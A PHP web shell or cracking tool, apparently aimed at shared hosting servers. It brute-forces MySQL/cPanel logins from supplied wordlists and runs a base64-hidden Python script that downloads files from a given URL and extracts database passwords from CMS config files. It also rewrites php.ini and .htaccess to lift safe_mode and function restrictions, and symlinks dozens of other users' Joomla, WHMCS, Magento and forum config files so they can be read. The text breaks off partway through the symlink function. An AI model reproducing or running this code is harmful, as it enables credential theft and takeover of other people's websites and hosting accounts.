<?php 
@set_time_limit(0);
@error_reporting(0);
echo '<head>
<style type="text/css">
<!--
body {
	background-color: #000000;
	font-family: Verdana;
    font-size: 14px;
	color: #e1e1e1;
	margin:5px;
}
input,textarea,select{
color: #00FF00;
border: 1px solid #1b2;
background-color: #080808;
}
input:hover,textarea:hover,select:hover{
color: #00FF00;
border: 1px solid #00FF00;
background-color: #080808;
}
a {
	background-color: #000000;
	vertical-align: bottom;
	text-decoration: none;
	font-size: 14px;
	color:#1b2;
}
a:hover {
	background-color: #080808;
	vertical-align: bottom;
	text-decoration: none;
	font-size: 14px;
	color:#00FF00;
}
.label {
	color: #e1e1e1;
	padding:3px;
}
td {
border-bottom:2px solid #FFFFFF;
background:#000000;
}
hr {
color:#00FF00;
}
-->
</style>


</head>
';
if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "Tr!0 M4C4n Cpanel ~ User : (<font color=#00FF00>$user</font>) Pass : (<font color=#00FF00>$pass</font>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><hr noshade size=1>";
    echo "<center>[Done] : <font color=#00FF00>You Found</font> $ok <font color=#00FF00>CPanel,</font> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' style='color:#ffffff;background:#111111;border:0;padding:2px;border:1px solid #00ff00;width:80px;' value='Back !'></a></center></body>";
    exit;
}
}
if($_POST['pass']=='password'){
error_reporting(0);
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgonJycKQnk6SHNICicnJwoKaW1wb3J0IHN5cwppbXBvcnQg
b3MKaW1wb3J0IHJlCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB1cmxsaWIKaW1wb3J0IGdsb2IK
ZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCgppZiBsZW4oc3lzLmFyZ3YpICE9IDM6CiAgcHJp
bnQnJycJCiBVc2FnZTogJXMgW1VSTC4uLl0gW2RpcmVjdG9yeS4uLl0KIEV4KSAlcyBodHRwOi8v
d3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3Zb
MF0pCiAgc3lzLmV4aXQoMSkKCnNpdGUgPSBzeXMuYXJndlsxXQpmb3V0ID0gc3lzLmFyZ3ZbMl0K
CnRyeToKICByZXEgID0gdXJsbGliLnVybG9wZW4oc2l0ZSkKICByZWFkID0gcmVxLnJlYWQoKQog
IGlmIHN5c3RlbSgpID09ICdMaW51eCc6CiAgICBmID0gb3BlbignL3RtcC9kYXRhLnR4dCcsICd3
JykKICAgIGYud3JpdGUocmVhZCkKICAgIGYuY2xvc2UoKQogIGlmIHN5c3RlbSgpID09ICdXaW5k
b3dzJzoKICAgIGYgPSBvcGVuKCdkYXRhLnR4dCcsICd3JykgIAogICAgZi53cml0ZShyZWFkKQog
ICAgZi5jbG9zZSgpCgogIGkgPSAwCiAgaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKICAgIGYgPSBv
cGVuKCcvdG1wL2RhdGEudHh0JywgJ3JVJykKICAgIGZvciBsaW5lIGluIGY6CiAgICAgIGlmIGxp
bmUuc3RhcnRzd2l0aCgnPGxpPjxhJykgPT0gVHJ1ZSA6CiAgICAgICAgbSA9IHJlLnNlYXJjaChy
Jyg8YSBocmVmPSIpKC4rW14+XSkoIj4pJywgbGluZSkKICAgICAgICBpICs9IDEKICAgICAgICBs
b2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpCiAgICAgICAgcHJpbnQgJ1Jl
dHJpZXZpbmcuLi5cdFx0Jywgc2l0ZSArIG0uZ3JvdXAoMikKICAgICAgICB0cnk6ICB1cmxsaWIu
dXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpCiAgICAgICAgZXhjZXB0
IElPRXJyb3I6CiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUg
aXQgZmlyc3QnICUgZm91dAogICAgICAgICAgc3lzLmV4aXQoKQogICAgICBpZiBsaW5lLnN0YXJ0
c3dpdGgoJzxpbWcnKSA9PSBUcnVlOgogICAgICAgIG0xID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9
IikoLitbXj5dKSgiPiknLCBsaW5lKQogICAgICAgIGkgKz0gMQogICAgICAgIGxvY2FsX25hbWUg
PSAnJXMvZmlsZSVkLnR4dCcgJSAoZm91dCwgaSkKICAgICAgICBwcmludCAnUmV0cmlldmluZy4u
Llx0XHQnLCBzaXRlICsgbTEuZ3JvdXAoMikKICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmll
dmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQogICAgICAgIGV4Y2VwdCBJT0Vycm9y
OgogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0
JyAlIGZvdXQKICAgICAgICAgIHN5cy5leGl0KCkKICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8
SU1HJykgPT0gVHJ1ZToKICAgICAgICBtMiA9IHJlLnNlYXJjaChyJyg8QSBIUkVGPSIpKC4rW14+
XSkoIj4pJywgbGluZSkKICAgICAgICBpICs9IDEKICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2Zp
bGUlZC50eHQnICUgKGZvdXQsIGkpCiAgICAgICAgcHJpbnQgJ1JldHJpZXZpbmcuLi5cdFx0Jywg
c2l0ZSArIG0yLmdyb3VwKDIpCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUg
KyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAg
ICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0
CiAgICAgICAgICBzeXMuZXhpdCgpCiAgICBmLmNsb3NlKCkKICBpZiBzeXN0ZW0oKSA9PSAnV2lu
ZG93cyc6CiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQogICAgZm9yIGxpbmUgaW4gZjoK
ICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8bGk+PGEnKSA9PSBUcnVlIDoKICAgICAgICBtID0g
cmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQogICAgICAgIGkgKz0g
MQogICAgICAgIGxvY2FsX25hbWUgPSAnJXMvZmlsZSVkLnR4dCcgJSAoZm91dCwgaSkKICAgICAg
ICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQogICAgICAgIHRy
eTogIHVybGxpYi51cmxyZXRyaWV2ZShzaXRlICsgbS5ncm91cCgyKSwgbG9jYWxfbmFtZSkKICAg
ICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhp
c3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0CiAgICAgICAgICBzeXMuZXhpdCgpCiAgICAgIGlm
IGxpbmUuc3RhcnRzd2l0aCgnPGltZycpID09IFRydWU6CiAgICAgICAgbTEgPSByZS5zZWFyY2go
cicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpCiAgICAgICAgaSArPSAxCiAgICAgICAg
bG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQogICAgICAgIHByaW50ICdS
ZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQogICAgICAgIHRyeTogIHVybGxp
Yi51cmxyZXRyaWV2ZShzaXRlICsgbTEuZ3JvdXAoMiksIGxvY2FsX25hbWUpCiAgICAgICAgZXhj
ZXB0IElPRXJyb3I6CiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVh
dGUgaXQgZmlyc3QnICUgZm91dAogICAgICAgICAgc3lzLmV4aXQoKQogICAgICBpZiBsaW5lLnN0
YXJ0c3dpdGgoJzxJTUcnKSA9PSBUcnVlOgogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhS
RUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQogICAgICAgIGkgKz0gMQogICAgICAgIGxvY2FsX25h
bWUgPSAnJXMvZmlsZSVkLnR4dCcgJSAoZm91dCwgaSkKICAgICAgICBwcmludCAnUmV0cmlldmlu
Zy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikKICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0
cmlldmUoc2l0ZSArIG0yLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQogICAgICAgIGV4Y2VwdCBJT0Vy
cm9yOgogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZp
cnN0JyAlIGZvdXQKICAgICAgICAgIHN5cy5leGl0KCkKICAgIGYuY2xvc2UoKQogIGlmIHN5c3Rl
bSgpID09ICdMaW51eCc6CiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3Blbigncm0gLXJmIC90
bXAvZGF0YS50eHQgPiAvZGV2L251bGwnLCBzaGVsbD1UcnVlKS53YWl0KCkKICBpZiBzeXN0ZW0o
KSA9PSAnV2luZG93cyc6CiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRh
dGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpCiAgcHJpbnQgJ1xuJywgJy0nICogMTAwLCAnXG4n
CiAgaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBv
cy53YWxrKGZvdXQpOgogICAgICBmb3IgZm5hbWUgaW4gZmlsZXM6CiAgICAgICAgZnVsbHBhdGgg
PSBvcy5wYXRoLmpvaW4ocm9vdCwgZm5hbWUpCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdy
JykKICAgICAgICBmb3IgbGluZSBpbiBmOgogICAgICAgICAgc2VjciA9IHJlLnNlYXJjaCAociIo
ZGJfcGFzc3dvcmQnXSA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkKICAgICAgICAgIGlmIHNlY3Ig
aXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgCiAgICAgICAgICBzZWNyMSA9IHJl
LnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkKICAgICAgICAgIGlm
IHNlY3IxIGlzIG5vdCBOb25lOiAgcHJpbnQgIChzZWNyMS5ncm91cCgyKSkKICAgICAgICAgIHNl
Y3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkK
ICAgICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpCiAg
ICAgICAgICBzZWNyMyA9IHJlLnNlYXJjaCAociIoZGJwYXNzID0uLikoLitbXj5dKSguOykiLCBs
aW5lKQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgy
KSkKICAgICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5d
KSguOykiLCBsaW5lKQogICAgICAgICAgaWYgc2VjcjQgaXMgbm90IE5vbmU6IHByaW50IChzZWNy
NC5ncm91cCgyKSkKICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSgu
K1tePl0pKCc7KSIsIGxpbmUpCiAgICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQg
KHNlY3I1Lmdyb3VwKDIpKQogICAgICAgICAgc2VjcjYgPSByZS5zZWFyY2ggKHIiKGRicGFzc3dk
ID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6
IHByaW50IChzZWNyNi5ncm91cCgyKSkKICAgICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIiht
b3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpCiAgICAgICAgICBpZiBz
ZWNyNyBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I3Lmdyb3VwKDIpKQogICAgICAgIGYuY2xvc2Uo
KQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoKICAgIGZvciBpbmZpbGUgaW4gZ2xvYi5nbG9i
KCBvcy5wYXRoLmpvaW4oZm91dCwgJyoudHh0JykgKToKICAgICAgZiA9IG9wZW4oaW5maWxlLCAn
cicpCiAgICAgIGZvciBsaW5lIGluIGY6CiAgICAgICAgc2VjciA9IHJlLnNlYXJjaCAociIoZGJf
cGFzc3dvcmQnXSA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkKICAgICAgICBpZiBzZWNyIGlzIG5v
dCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIAogICAgICAgIHNlY3IxID0gcmUuc2VhcmNo
KHIiKHBhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQogICAgICAgIGlmIHNlY3IxIGlz
IG5vdCBOb25lOiAgcHJpbnQgIChzZWNyMS5ncm91cCgyKSkKICAgICAgICBzZWNyMiA9IHJlLnNl
YXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpCiAgICAgICAgaWYg
c2VjcjIgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMi5ncm91cCgzKSkKICAgICAgICBzZWNyMyA9
IHJlLnNlYXJjaCAociIoZGJwYXNzID0uLikoLitbXj5dKSguOykiLCBsaW5lKQogICAgICAgIGlm
IHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpCiAgICAgICAgc2VjcjQg
PSByZS5zZWFyY2ggKHIiKERCUEFTU1dPUkQgPSAnKSguK1tePl0pKC47KSIsIGxpbmUpCiAgICAg
ICAgaWYgc2VjcjQgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNC5ncm91cCgyKSkKICAgICAgICBz
ZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQogICAg
ICAgIGlmIHNlY3I1IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjUuZ3JvdXAoMikpCiAgICAgICAg
c2VjcjYgPSByZS5zZWFyY2ggKHIiKGRicGFzc3dkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQog
ICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpCiAgICAg
ICAgc2VjcjcgPSByZS5zZWFyY2ggKHIiKG1vc0NvbmZpZ19wYXNzd29yZCA9ICcpKC4rW14+XSko
JzspIiwgbGluZSkKICAgICAgICBpZiBzZWNyNyBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I3Lmdy
b3VwKDIpKQogICAgICBmLmNsb3NlKCkKZXhjZXB0IChLZXlib2FyZEludGVycnVwdCk6CiAgcHJp
bnQgJ1xuVGhhbmtzIGZvciB1c2luZyBpdCAuX14n';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><br/><center>[Selesai] : <span style='color:#00ff00;'>Scrol Kebawah Untuk Melihat Password DB</span>
<a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' style='color:#ffffff;background:#111111;border:0;padding:2px;border:1px solid #00ff00;width:80px;' value='Kembali !'></a></center></body>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<body style='background:#000000;color:#ffffff;font-size:17px;font-family:Tahoma,Verdana,Arial;'><br/><center>[Done] : <span style='color:#00ff00;'>Successfull, </span> <a href=".$_SERVER['PHP_SELF']." style='text-decoration:none;'><input type='button' style='color:#ffffff;background:#111111;border:0;padding:2px;border:1px solid #00ff00;width:80px;' value='Back !'></a></center></body>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
symlink('/home/'.$usern.'/public_html/beta/configuration.php',$pdomain.' ~~ beta - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.' ~~ joomla.txt');
 symlink('/home/'.$usern.'/public_html/app/etc/local.xml',$pdomain.' ~~ Magento.txt');
 symlink('/home/'.$usern.'/public_html/home/configuration.php',$pdomain.' ~~ home - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/store/configuration.php',$pdomain.' ~~ store - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.' ~~ joomla - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/protal/configuration.php',$pdomain.' ~~ protal - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/joom/configuration.php',$pdomain.' ~~ joom - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/joo/configuration.php',$pdomain.' ~~ jom - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/v1/submitticket.php',$pdomain.' ~~ v1 - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/v2/submitticket.php',$pdomain.' ~~ v2 - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/cms/configuration.php',$pdomain.' ~~ cms - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/site/configuration.php',$pdomain.' ~~ site - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/main/configuration.php',$pdomain.' ~~ main - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/news/configuration.php',$pdomain.' ~~ news - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/new/configuration.php',$pdomain.' ~~ new - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/home/configuration.php',$pdomain.' ~~ home - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/test/configuration.php',$pdomain.' ~~ test - Joomla.txt');
 symlink('/home/'.$usern.'/public_html/myshop/configuration.php',$pdomain.' ~~ myshop - Joomla.txt');
symlink('/home/'.$usern.'/public_html/Settings.php',$pdomain.' ~~ Smf.txt');
 symlink('/home/'.$usern.'/public_html/managerv1/configuration.php',$pdomain.' ~~ customers - Whm23.txt');
 symlink('/home/'.$usern.'/public_html/smf/Settings.php',$pdomain.' ~~ smf - Smf.txt');
 symlink('/home/'.$usern.'/public_html/forums/Settings.php',$pdomain.' ~~ forums - Smf.txt');
 symlink('/home/'.$usern.'/public_html/sites/default/settings.php',$pdomain.' ~~ sites - default - configuration 3.txt');
symlink('/home/'.$usern.'/public_html/includes/dist-configure.php',$pdomain.' ~~ Zencart.txt');
 symlink('/home/'.$usern.'/public_html/zencart/includes/dist-configure.php',$pdomain.' ~~ zencart - zencart.txt');
 symlink('/home/'.$usern.'/public_html/shop/includes/dist-configure.php',$pdomain.' ~~ Shop - zencart.txt');
symlink('/home/'.$usern.'/public_html/includes/configure.php',$pdomain.' ~~ Oscommerce.txt');
 symlink('/home/'.$usern.'/public_html/oscommerce/includes/configure.php',$pdomain.' ~~ oscommerce - Oscommerce.txt');
 symlink('/home/'.$usern.'/public_html/oscommerces/includes/configure.php',$pdomain.' ~~ oscommerces -Oscommerces.txt');
 symlink('/home/'.$usern.'/public_html/shopping/includes/configure.php',$pdomain.' ~~ shopping - Shopping.txt');
 symlink('/home/'.$usern.'/public_html/sale/includes/configure.php',$pdomain.' ~~ sale - Oscommerce.txt');
 symlink('/home/'.$usern.'/public_html/store/includes/configure.php',$pdomain.' ~~ store - Oscommerce.txt');
symlink('/home/'.$usern.'/public_html/inc/config.php',$pdomain.' ~~ MyBB.txt');
 symlink('/home/'.$usern.'/public_html/forum/inc/config.php',$pdomain.' ~~ forum - MyBB .txt');
 symlink('/home/'.$usern.'/public_html/lib/config.php',$pdomain.' ~~ Balitbang.txt');
 symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.' ~~ VBulletin4.txt');
 symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.' ~~ forum - vBulletin.txt');
 symlink('/home/'.$usern.'/public_html/forum/config.php',$pdomain.' ~~ forum - PhpBB.txt');
 symlink('/home/'.$usern.'/public_html/amember/config.inc.php',$pdomain.' ~~ Amember.txt');
 symlink('/home/'.$usern.'/public_html/config.inc.php',$pdomain.' ~~ Amember2.txt');
 symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.' ~~ Vb.txt');
 symlink('/home/'.$usern.'/public_html/vb3/includes/config.php',$pdomain.' ~~ Vb3.txt');
 symlink('/home/'.$usern.'/public_html/upload/includes/config.php',$pdomain.' ~~ Upload.txt');
 symlink('/home/'.$usern.'/public_html/incl/config.php',$pdomain.' ~~ Malay.txt');
 symlink('/home/'.$usern.'/public_html/config/koneksi.php',$pdomain.' ~~ Lokomedia.txt');
 symlink('/home/'.$usern.'/public_html/datas/config.php',$pdomain.' ~~ datas - configuration 3.txt');
symlink('/home/'.$usern.'/public_html/forum/conf/config.php',$pdomain.' ~~ forum - Other-1.txt');
 symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.' ~~ Other-2.txt');
 symlink('/home/'.$usern.'/public_html/config.php',$pdomain.' ~~ Other-3.txt');
 symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.' ~~ admin - Other-4.txt');
 symlink('/home/'.$usern.'/public_html/codelibrary/inc/variables.php',$pdomain.' ~~ Other-6.txt');
 symlink('/home/'.$usern.'/public_html/administrator/db/configuration.php',$pdomain.' ~~ administrator - Other-7.txt');
 symlink('/home/'.$usern.'/public_html/gallery/include/config.inc.php',$pdomain.' ~~ gallery - Other-8.txt');
 symlink('/home/'.$usern.'/public_html/conn.php',$pdomain.' ~~ Other-9.txt');
symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.' ~~ client - admin Whm1.txt');
 symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.' ~~ clients - Whm2.txt');
 symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.' ~~ billing - Whm3.txt');
 symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.' ~~ Whm4.txt');
 symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.' ~~ whmcs - Whm5.txt');
 symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.' ~~ whm - Whm6.txt');
 symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.' ~~ order - Whm7.txt');
 symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.' ~~ whmc - Whm8.txt');
 symlink('/home/'.$usern.'/public_html/submitticket.php',$pdomain.' ~~ whm9.txt');
 symlink('/home/'.$usern.'/public_html/manage/configuration.php',$pdomain.' ~~ manage -Whm10.txt');
 symlink('/home/'.$usern.'/public_html/clientes/configuration.php',$pdomain.' ~~ clientes - Whm11.txt');
 symlink('/home/'.$usern.'/public_html/cliente/configuration.php',$pdomain.' ~~ cliente - Whm12.txt');
 symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.' ~~ support - Whm13.txt');
 symlink('/home/'.$usern.'/public_html/supports/configuration.php',$pdomain.' ~~ supports - Whm14.txt');
 symlink('/home/'.$usern.'/public_html/cpanel/configuration.php',$pdomain.' ~~ cpanel - Whm15.txt');
 symlink('/home/'.$usern.'/public_html/panel/configuration.php',$pdomain.' ~~ panel - Whm16.txt');
 symlink('/home/'.$usern.'/public_html/host/configuration.php',$pdomain.' ~~ host - Whm17.txt');
 symlink('/home/'.$usern.'/public_html/hosting/configuration.php',$pdomain.' ~~ hosting - Whm18.txt');
 symlink('/home/'.$usern.'/public_html/hosts/configuration.php',$pdomain.' ~~ hosts - Whm19.txt');
 symlink('/home/'.$usern.'/public_html/v1/submitticket.php',$pdomain.' ~~ v1 - Whm20.txt');
 symlink('/home/'.$usern.'/public_html/v2/submitticket.php',$pdomain.' ~~ v2 - Whm21.txt');
 symlink('/home/'.$usern.'/public_html/baru/configuration.php',$pdomain.' ~~ baru - Whm22.txt');
 symlink('/home/'.$usern.'/public_html/customers/configuration.php',$pdomain.' ~~ customers - Whm23.txt');
 symlink('/home/'.$usern.'/public_html/customer/configuration.php',$pdomain.' ~~ customer - Whm24.txt');
 symlink('/home/'.$usern.'/public_html/test/submitticket.php',$pdomain.' ~~ test - Whm25.txt');
 symlink('/home/'.$usern.'/public_html/new/submitticket.php',$pdomain.' ~~ new - Whm26.txt');
 symlink('/home/'.$usern.'/public_html/login/configuration.php',$pdomain.' ~~ login - Whm27.txt');
 symlink('/home/'.$usern.'/public_html/cp/configuration.php',$pdomain.' ~~ cp - Whm28.txt');
 symlink('/home/'.$usern.'/public_html/secure/configuration.php',$pdomain.' ~~ secure - Whm29.txt');
 symlink('/home/'.$usern.'/public_html/member/configuration.php',$pdomain.' ~~ member - Whm30.txt');
 symlink('/home/'.$usern.'/public_html/account/configuration.php',$pdomain.' ~~ account - Whm31.txt');
 symlink('/home/'.$usern.'/public_html/forums/submitticket.php',$pdomain.' ~~ forums - Whm32.txt');
 symlink('/home/'.$usern.'/public_html/webhos/submitticket.php',$pdomain.' ~~ webhos - Whm33.txt');
 symlink('/home/'.$usern.'/public_html/webhosting/configuration.php',$pdomain.' ~~ webhosting - Whm34.txt');
 symlink('/home/'.$usern.'/public_html/includes/configuration.php',$pdomain.' ~~ Hosting tools - Whm35.txt');
 symlink('/home/'.$usern.'/public_html/cpanel/conf.inc.php',$pdomain.' ~~ Hosting tools - Whm36.txt');
 symlink('/home/'.$usern.'/public_html/clientsupport/configuration.php',$pdomain.' ~~ clientsupport - Whm37.txt');
 symlink('/home/'.$usern.'/public_html/controlpanel/configuration.php',$pdomain.' ~~ controlpanel - Whm38.txt');
 symlink('/home/'.$usern.'/public_html/accounts/configuration.php',$pdomain.' ~~ accounts - Whm39.txt');
 symlink('/home/'.$usern.'/public_html/clien/configuration.php',$pdomain.' ~~ clien - Whm40.txt');
 symlink('/home/'.$usern.'/public_html/myshop/submitticket.php',$pdomain.' ~~ myshop - whm41.txt');
 symlink('/home/'.$usern.'/public_html/secure/configuration.php',$pdomain.' ~~ clien - secure Whm.txt');
 symlink('/home/'.$usern.'/public_html/secure/whm/configuration.php',$pdomain.' ~~ secure - whm - Whm.txt');
 symlink('/home/'.$usern.'/public_html/secure/whmcs/configuration.php',$pdomain.' ~~ secure - whmcs Whm.txt');
 symlink('/home/'.$usern.'/public_html/my/configuration.php',$pdomain.' ~~ my - Whm.txt');
 symlink('/home/'.$usern.'/public_html/supp/configuration.php',$pdomain.' ~~ clien - joom or Whm.txt');
 symlink('/home/'.$usern.'/public_html/supports/includes/iso4217.php',$pdomain.' ~~ supports - HostbillsWhm.txt');
 symlink('/home/'.$usern.'/public_html/client/includes/iso4217.php',$pdomain.' ~~ client - HostbillsWhm.txt');
 symlink('/home/'.$usern.'/public_html/support/includes/iso4217.php',$pdomain.' ~~ support - HostbillsWhm.txt');
 symlink('/home/'.$usern.'/public_html/billing/includes/iso4217.php',$pdomain.' ~~ billing - HostbillsWhm.txt'); 
 symlink('/home/'.$usern.'/public_html/billings/includes/iso4217.php',$pdomain.' ~~ billings - HostbillsWhm.txt');
 symlink('/home/'.$usern.'/public_html/host/includes/iso4217.php',$pdomain.' ~~ host - HostbillsWhm.txt'); 
 symlink('/home/'.$usern.'/public_html/hosts/includes/iso4217.php',$pdomain.' ~~ hosts - whostbillshm.txt');
 symlink('/home/'.$usern.'/public_html/hosting/includes/iso4217.php',$pdomain.' ~~ hosting - HostbillsWhm.txt');
 symlink('/home/'.$usern.'/public_html/hostings/includes/iso4217.php',$pdomain.' ~~ hostings - HostbillsWhm.txt');
